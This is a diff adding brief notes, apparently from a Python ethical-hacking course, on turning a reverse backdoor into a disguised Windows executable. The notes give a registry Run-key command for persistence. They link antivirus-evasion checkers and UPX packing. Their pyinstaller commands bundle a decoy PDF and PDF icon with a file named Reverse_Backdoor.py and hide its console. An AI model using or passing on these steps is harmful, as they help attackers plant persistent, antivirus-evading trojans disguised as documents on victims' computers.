@@ -1,0 +1,16 @@
+Persistence
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t Reg_Sz /d "C:/test.exe"
+command to run file when windows starts
+
+check malware :
+https://antiscan.me/
+https://kleenscan.com/index
+convert python file to exe
+https://github.com/upx/upx/releases/
+
+./wine pyinstaller.exe file.py --onefile --noconsole --icon (fileicon)
+https://www.iconfinder.com/search?q=pdf&price=free # get icon
+https://convertio.co/vn/png-ico/     # convert to ico file
+
+example :wine /root/Scripts/pyinstaller.exe --add-data "/root/PycharmProjects/Pythonethicalhacking/Packaging/sample.pdf;." --onefile --noconsole --icon /ro
+ot/PycharmProjects/Pythonethicalhacking/Packaging/pdf.ico /root/PycharmProjects/Pythonethicalhacking/Back_Door/Reverse_Backdoor.py
